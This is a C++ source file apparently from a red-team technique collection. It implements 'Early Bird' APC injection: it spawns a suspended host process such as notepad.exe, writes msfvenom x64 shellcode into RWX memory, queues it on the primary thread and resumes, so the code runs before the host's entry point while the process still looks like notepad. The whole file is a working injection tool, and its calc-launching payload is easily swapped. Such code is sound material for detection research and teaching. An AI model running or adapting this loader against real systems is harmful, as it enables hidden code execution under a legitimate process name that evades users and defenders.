/*
 * Early Bird APC Injection - T1055.004 variant
 *
 * The standard APC injection sprays QueueUserAPC on every thread of an
 * already-running target and hopes one of them hits an alertable wait.
 *
 * Early Bird flips this around: we spawn a brand-new process ourselves
 * with CREATE_SUSPENDED, write shellcode, queue an APC on the primary
 * thread, then ResumeThread. Because the primary thread of a freshly
 * created process is guaranteed to enter an alertable wait inside
 * ntdll!LdrInitializeThunk, the APC fires reliably as the very first
 * code to execute in the new process.
 *
 * Difference from apc_injection.cpp (T1055.004):
 *   - Target is a NEW process we spawn (here: notepad.exe), not an
 *     existing one.
 *   - Only ONE thread exists at that moment (the primary), so there is
 *     no QueueUserAPC spray.
 *   - Shellcode runs BEFORE the target's own entry point, so the new
 *     process looks like it was always notepad.exe in Task Manager.
 *
 * MinGW cross-compile:
 *   x86_64-w64-mingw32-g++ -std=c++20 -o early_bird_apc.exe early_bird_apc.cpp
 *
 * MSVC:
 *   cl /std:c++20 early_bird_apc.cpp /Fe:early_bird_apc.exe
 *
 * Usage:
 *   early_bird_apc.exe                    spawn notepad.exe, inject calc shellcode
 *   early_bird_apc.exe <host.exe>         spawn <host.exe>, inject calc shellcode
 */

#include <windows.h>
#include <stdio.h>
#include <string.h>

/* msfvenom -p windows/x64/exec CMD=calc.exe EXITFUNC=thread -f c */
unsigned char default_shellcode[] =
    "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
    "\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
    "\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
    "\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
    "\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
    "\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
    "\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
    "\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
    "\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
    "\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
    "\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
    "\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
    "\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
    "\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
    "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"
    "\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff"
    "\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
    "\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x61\x6c"
    "\x63\x2e\x65\x78\x65\x00";

int main(int argc, char** argv) {
    const char* host_exe = (argc >= 2) ? argv[1] : "C:\\Windows\\System32\\notepad.exe";
    printf("[+] host process : %s\n", host_exe);

    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = {};
    char cmd[MAX_PATH];
    strncpy_s(cmd, sizeof(cmd), host_exe, _TRUNCATE);

    if (!CreateProcessA(nullptr, cmd, nullptr, nullptr, FALSE,
                        CREATE_SUSPENDED | CREATE_NEW_CONSOLE,
                        nullptr, nullptr, &si, &pi)) {
        printf("[-] CreateProcess failed (%lu)\n", GetLastError());
        return 1;
    }
    printf("[+] spawned PID %lu (suspended), primary TID %lu\n", pi.dwProcessId, pi.dwThreadId);

    SIZE_T sc_len = sizeof(default_shellcode);
    LPVOID remote = VirtualAllocEx(pi.hProcess, nullptr, sc_len,
                                   MEM_COMMIT | MEM_RESERVE,
                                   PAGE_EXECUTE_READWRITE);
    if (!remote) {
        printf("[-] VirtualAllocEx failed (%lu)\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        return 2;
    }

    SIZE_T wrote = 0;
    if (!WriteProcessMemory(pi.hProcess, remote, default_shellcode, sc_len, &wrote)
        || wrote != sc_len) {
        printf("[-] WriteProcessMemory failed (%lu)\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        return 3;
    }
    printf("[+] shellcode written to %p (%llu bytes)\n", remote, (unsigned long long)wrote);

    /*
     * Queue the shellcode as a user-mode APC on the primary (suspended)
     * thread. The thread will run it inside LdrInitializeThunk's first
     * alertable wait, which happens before the EXE's entry point runs.
     */
    if (!QueueUserAPC((PAPCFUNC)remote, pi.hThread, 0)) {
        printf("[-] QueueUserAPC failed (%lu)\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        return 4;
    }
    printf("[+] APC queued on primary thread\n");

    if (ResumeThread(pi.hThread) == (DWORD)-1) {
        printf("[-] ResumeThread failed (%lu)\n", GetLastError());
        TerminateProcess(pi.hProcess, 1);
        return 5;
    }
    printf("[+] thread resumed. Shellcode should run before %s's own code.\n", host_exe);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return 0;
}
